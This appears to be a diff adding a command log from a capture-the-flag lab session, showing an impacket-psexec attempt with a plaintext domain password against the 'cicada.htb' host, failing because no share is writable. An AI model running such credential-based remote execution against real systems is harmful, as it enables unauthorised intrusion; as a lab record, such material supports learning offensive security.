@@ -1,0 +1,16 @@
+### [2026-04-01 00:29:54] impacket-psexec cicada.htb/michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8@10.129.231.149
+
+$ impacket-psexec cicada.htb/michael.wrightson:Cicada$M6Corpb*@Lp#nZp!8@10.129.231.149
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Requesting shares on 10.129.231.149.....
+[-] share 'ADMIN$' is not writable.
+[-] share 'C$' is not writable.
+[-] share 'DEV' is not writable.
+[-] share 'HR' is not writable.
+[-] share 'NETLOGON' is not writable.
+[-] share 'SYSVOL' is not writable.
+
+# Exit code: 0
+# Duration: 2026-04-01 00:29:55
